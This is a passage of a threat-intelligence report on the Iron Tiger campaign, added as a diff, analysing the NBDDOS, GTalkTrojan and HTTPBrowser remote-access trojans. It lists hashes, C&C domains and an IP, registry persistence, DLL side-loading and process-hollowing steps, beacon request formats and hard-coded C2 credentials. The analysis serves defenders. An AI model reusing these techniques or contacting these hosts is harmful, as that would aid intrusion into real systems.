@@ -1,0 +1,156 @@
+Ring RAT is not available in underground forums or any publicly accessible site. This modified Gh0st RAT could have been created for Iron Tiger’s or a closed community’s exclusive use.
+31 | Operation Iron Tiger
+NBDDOS
+Iron Tiger uses another Gh0st RAT variant, NBDDOS. A file named “ver.exe” (SHA-1:
+8c8f12ae866c38931e19d67fadc19bd18aaf0865 ), which was compiled on 26 December 2014, drops a DLL
+(SHA-1: 5b638171811412b570ed500803ceca5ed85580ff ), which was compiled 1 minute before ver.exe
+was.
+The DLL was dropped into %TEMP% then moved to %system%. Careful examination and comparison with
+Gh0st’s code revealed that it was another derivative of the latter. NBDDOS is installed as a service named
+“MediaCenter.” This can’t be used as an IoC, however, since it can be easily configured using the builder.
+NBDDOS’s service name and description
+NBDDOS’s installation function can be modified using a multi-strcat function, probably in an attempt to
+evade string-based detection. Its C&C server address can be extracted from a Web page or is hard-coded
+in its binary.
+Improved NBDDOS installation function
+32 | Operation Iron Tiger
+Two C&C server types supported by NBDDOS
+NBDDOS was configured to retrieve C&C server addresses from a single Web page— phpxss.lofter.com.
+Lofter.com is a light blogging or social networking service. It also uses “phpxss” as account name.
+If the Web page option is configured, the IP address and port number must be surrounded by a unique
+magic string, “$$$$$$$$$$$$.” Two magic strings accompany the C&C server string, which can help
+serve as an IoC for other security investigators. Compared with the original Gh0st RAT, NBDDOS uses a
+different encryption function.
+Web page containing NBDDOS’s C&C server information
+33 | Operation Iron Tiger
+NBDDOS’s encryption function
+NBDDOS also uses a special string, “Vip20141226,” where “20141226” can correspond to the binary’s
+compilation date. We have no idea though what “Vip” represents. The only reference we found was inside
+the controller, near the credentials.
+An NBDDOS controller used in Iron Tiger (SHA-1: 396af3ae018a9e251a832cce8aae1bcaa11cdc05 )
+compiled on 8 December 2014 was named “hello.exe.”
+NBDDOS controller’s GUI
+34 | Operation Iron Tiger
+Most of the original Gh0st RAT’s functions have
+been removed from NBDDOS, except for the
+remote control feature. Its builder supports the
+C&C server types, namely:
+
+C&C information extracted from a Web page
+
+or file
+
+
+Use of DNS resolution
+
+
+Use of direct IP addresses
+
+
+Two packers—UPX and FSG—are available though
+users can also generate unpacked malware.
+Malware service names can be easily changed on
+infected systems via the same interface.
+NBDDOS can easily be downloaded from Chinese
+underground forums. NBDDOS builder
+A Chinese underground forum offering NBDDOS’s source code
+GTalkTrojan
+GTalkTrojan (SHA-1: 50d2fef4e680072441084053773350d9ba60cac6 ), which was compiled on 15
+October 2012, has very few functions, including:
+
+Provides a remote shell
+
+Has a “getfile” feature for data exfiltration (Note that it can only send files from a victim’s computer to
+a C&C server.)
+
+Has a “settime” feature to set when infected systems should access C&C servers (default: 1 second)
+
+35 | Operation Iron Tiger
+“Getfile” and “settime” functions of GTalkTrojan
+To remain persistent, GTalkTrojan adds a RunOnce registry key, _HKEY_CURRENT_USER\SOFTWARE_
+Microsoft\Windows\CurrentVersion\RunOnce. It then copies itself into c:\windows\svchost.exe,
+creates a “cmd” command pipe, and accesses a C&C server— update.gtalklite.com —via port 8080.
+GTalk Trojan adds the “vnet” registry key to remain persistent
+36 | Operation Iron Tiger
+“Cmd” that GTalkTrojan creates
+C&C server reference in GTalkTrojan
+When a connection is established, GTalkTrojan sends the following information to a C&C server:
+```
+  Computer=[USERNAME]&lanip=&uid=&os=
+ followed by command output
+```
+Network capture showing the data GTalkTrojan sends to a C&C server
+37 | Operation Iron Tiger
+Should a C&C server require authentication, the following credentials are hard-coded into the binary:
+```
+  Username: idmservice
+Password: D13idmAdm
+```
+GTalkTrojan uses the User-Agent, “HttpDump/1.0,” and sends out an MD5 hash as UID for SysDrive
+SerialNumber. It used the gtalklite.com domain in its compilation registration.
+```
+   Registrant Contact:
+zhong meng [REDACTED]
+sheng li [REDACTED]
+[REDACTED]j @ 126 . com
+tel: +86.[REDACTED]97837
+fax: +86.[REDACTED]97837
+he bei sheng he jian sha wa xiang xi liu wa cun
+CN
+```
+GTalkTrojan’s registration information
+We found two other domains registered with the same information though they were not used in any
+targeted attack operation that we know of.
+HTTPBrowser
+HTTPBrowser infects systems like PlugX does—via DLL side-loading. One version (SHA-1:
+75f098d6b3f217aba4c068b12896c332216fc6b3 ) used in Iron Tiger employed a legitimate Kaspersky
+binary named “setup.exe” to infect systems with a malicious DLL. When launched, setup.exe:
+
+
+Loads msi.dll via the DLL Hijacking technique
+
+
+Unencrypts and runs msi.dll in memory
+
+
+Copies itself into _%ALLUSER%\Application Data\kav_
+
+
+Creates the Run registry key, HKLM\Software\Microsoft\Current Version\Run, to remain persistent
+
+
+Creates the suspended process, msiexec.exe [CnC IP] [CnC Port] 1
+
+
+Creates and runs a remote thread in the suspended process
+
+
+Unpacks msi.dll.url
+
+
+Replaces the original msiexec.exe image in memory with a malicious code
+
+
+Executes the malicious code
+
+
+Accesses a C&C server and waits for commands
+
+
+38 | Operation Iron Tiger
+HTTPBrowser uses a specific technique to bypass User Access Control (UAC) [9] .
+HTTPBrowser’s C&C server IP address and port information
+HTTPBrowser accesses a C&C server with the IP address, 103.24.1.54, via port 443. This was hosted in
+Hong Kong at the time this paper was written. It creates a unique GUID that is stored in config.ini on
+infected systems. It then accesses a C&C server using the following HTTP GET request:
+```
+  GET /loop?c=[computer]->[user]&l=[ip]&o=[os version]&u=[client id]&r=[inject
+mode]&t=[time stamp]
+Host: REDACTED
+Connection: Keep-Alive
+User-Agent: HttpBrowser/1.0
+```
+HTTPBrowser has remote shell-creation, uploading and/or downloading, and file-listing functions, which
+make it a lightweight RAT that capable of executing more malicious commands or even exfiltrating data.
+To the best of our knowledge, it is not available in underground forums or other publicly accessible sites. It
+could have been created for the exclusive use in targeted attacks.
